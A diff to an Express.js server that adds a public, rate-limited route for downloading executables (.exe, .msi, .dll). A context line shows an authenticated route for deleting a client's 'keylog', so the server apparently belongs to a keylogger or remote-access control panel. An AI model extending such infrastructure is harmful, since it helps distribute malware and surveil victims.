@@ -532,6 +532,49 @@ app.delete('/api/clients/:id/keylog', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
+
+// ---------- exe downloads (public, rate limited) ----------
+const DOWNLOAD_DIR = path.join(__dirname, 'download');
+if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
+
+const ALLOWED_EXT = ['.exe', '.zip', '.msi', '.dll', '.bin'];
+
+const limitDownloadExe = rateLimit({
+  windowMs: 60 * 60 * 1000,
+  max: 10,
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: { error: 'download limit reached — 10 per hour' },
+});
+
+app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
+  const name = String(req.params.name || '');
+
+  if (!name || name.includes('..') || name.includes('/') || name.includes('\\'))
+    return res.status(400).json({ error: 'bad name' });
+
+  if (!/^[A-Za-z0-9_\-\.]+$/.test(name))
+    return res.status(400).json({ error: 'bad name' });
+
+  const ext = path.extname(name).toLowerCase();
+  if (!ALLOWED_EXT.includes(ext))
+    return res.status(400).json({ error: 'file type not allowed' });
+
+  const full = path.resolve(DOWNLOAD_DIR, name);
+  const base = path.resolve(DOWNLOAD_DIR);
+  if (!full.startsWith(base + path.sep))
+    return res.status(400).json({ error: 'bad path' });
+
+  if (!fs.existsSync(full))
+    return res.status(404).json({ error: 'not found' });
+
+  const st = fs.statSync(full);
+  res.setHeader('Content-Type', 'application/octet-stream');
+  res.setHeader('Content-Length', st.size);
+  res.setHeader('Content-Disposition', `attachment; filename="${name}"`);
+  fs.createReadStream(full).pipe(res);
+});
+
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
 
